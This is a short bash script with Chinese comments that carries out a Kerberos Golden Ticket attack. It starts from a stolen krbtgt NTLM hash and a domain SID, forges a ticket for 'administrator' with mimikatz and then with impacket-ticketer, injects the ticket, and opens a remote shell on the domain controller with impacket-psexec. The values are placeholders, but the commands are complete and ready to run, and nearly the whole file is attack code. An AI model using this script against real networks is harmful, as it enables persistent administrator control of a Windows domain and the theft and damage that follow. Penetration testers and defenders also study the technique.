#!/bin/bash
# 黄金票据 Golden Ticket 攻击脚本
# 前提：已获取 krbtgt 账户的 NTLM 哈希和域 SID

DOMAIN="corp.local"
DOMAIN_SID="S-1-5-21-1234567890-1234567890-1234567890"
KRBTGT_HASH="deadbeefdeadbeefdeadbeefdeadbeef"
TARGET_USER="administrator"

echo "[*] 方式一：使用 mimikatz 伪造黄金票据"
cat << 'EOF'
# 在 mimikatz 中执行：
kerberos::golden \
    /user:${TARGET_USER} \
    /domain:${DOMAIN} \
    /sid:${DOMAIN_SID} \
    /krbtgt:${KRBTGT_HASH} \
    /ticket:golden.kirbi

# 注入票据
kerberos::ptt golden.kirbi

# 访问域控
dir \\DC01\C$
EOF

echo ""
echo "[*] 方式二：使用 impacket 伪造黄金票据"
impacket-ticketer \
    -nthash ${KRBTGT_HASH} \
    -domain-sid ${DOMAIN_SID} \
    -domain ${DOMAIN} \
    ${TARGET_USER}

echo ""
echo "[*] 使用伪造的票据"
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass ${DOMAIN}/${TARGET_USER}@DC01.${DOMAIN}
